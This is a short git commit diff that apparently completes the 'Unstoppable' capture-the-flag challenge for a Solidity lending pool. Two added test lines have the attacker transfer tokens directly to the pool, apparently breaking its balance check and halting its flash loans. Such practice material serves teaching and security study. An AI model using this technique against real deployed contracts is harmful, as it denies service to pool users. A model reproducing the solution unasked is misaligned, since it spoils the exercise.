c2c735441d4e8096bdda8cd80c93dca89549dd78
janus9 <shaoqingwong@gmail.com>
2022-08-23 21:03:21 +0800

    complete unstoppable challenge

--- test/unstoppable/unstoppable.challenge.js
+++ test/unstoppable/unstoppable.challenge.js
@@ -40,6 +40,8 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const attackerTokenContract = this.token.connect(attacker);
+        await attackerTokenContract.transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
     });
 
     after(async function () {
